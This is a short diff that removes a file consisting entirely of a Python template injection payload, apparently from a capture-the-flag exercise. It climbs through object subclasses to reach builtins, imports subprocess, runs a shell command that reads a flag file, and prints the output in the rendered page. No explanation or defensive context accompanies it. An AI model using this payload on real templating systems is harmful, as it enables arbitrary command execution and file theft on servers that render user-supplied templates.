@@ -1,6 +1,0 @@
-% a=[]
-% a.extend([i for i in ().__class__.__base__.__subclasses__() if 'warning' in str(i)])
-% b=getattr(getattr(getattr(a[0], '__init__'), '__globals__'), '__builtins__')
-% c=getattr(b, '__import__')('subprocess')
-% d=getattr(c, 'getoutput')('cat /flag')
-{{d}}
